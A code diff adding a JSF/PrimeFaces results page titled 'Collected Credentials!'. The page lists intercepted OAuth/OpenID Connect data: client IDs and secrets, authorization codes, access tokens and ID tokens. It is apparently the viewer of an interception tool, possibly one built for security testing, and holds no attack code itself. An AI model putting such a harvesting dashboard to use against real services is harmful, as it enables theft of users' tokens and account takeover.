@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:h="http://java.sun.com/jsf/html"
+      xmlns:f="http://java.sun.com/jsf/core"
+      xmlns:ui="http://java.sun.com/jsf/facelets"
+      xmlns:p="http://primefaces.org/ui">
+    <h:head>
+        <title>Results</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <style type="text/css">
+            .fixed-size {
+                table-layout: fixed;
+                word-wrap: break-word;
+            }
+        </style>
+    </h:head>
+    <h:body>
+        <p:dataTable var="data" value="#{applicationScope.database.interceptedTokens}" paginator="true" rows="15" rowsPerPageTemplate="5,10,15" style="fixed-size">
+            <f:facet name="header">
+                Collected Credentials! Expand rows to see detailed information.
+            </f:facet>
+            <p:column style="width:16px">
+                <p:rowToggler />
+            </p:column>
+
+            <p:column headerText="DateTime">
+                <h:outputText value="#{data.dateTime}" />
+            </p:column>
+
+            <p:column headerText="Client ID">
+                <h:outputText value="#{data.client_id}" />
+            </p:column>
+
+            <p:rowExpansion>
+                <p:panelGrid  columns="2" columnClasses="label,value" style="width:90%">
+                    <h:outputText value="DateTime" />
+                    <h:outputText value="#{data.dateTime}" />
+
+                    <h:outputText value="Client ID" />
+                    <h:outputText value="#{data.client_id}" />
+
+                    <h:outputText value="Client Secret" />
+                    <h:outputText value="#{data.client_secret}" />
+
+                    <h:outputText value="Redirect URI" />
+                    <h:outputText value="#{data.redirect_uri}" />
+
+                    <h:outputText value="Code" />
+                    <h:outputText value="#{data.code}" />
+
+                    <h:outputText value="AccessToken" />
+                    <h:outputText value="#{data.access_token}" />
+
+                    <h:outputText value="ID Token" />
+                    <h:outputText value="#{data.id_token}" />
+
+                    <h:outputText value="Ressources" />
+                    <h:outputText value="#{data.ressources}" />
+
+                </p:panelGrid>
+            </p:rowExpansion>
+        </p:dataTable>
+    </h:body>
+</html>
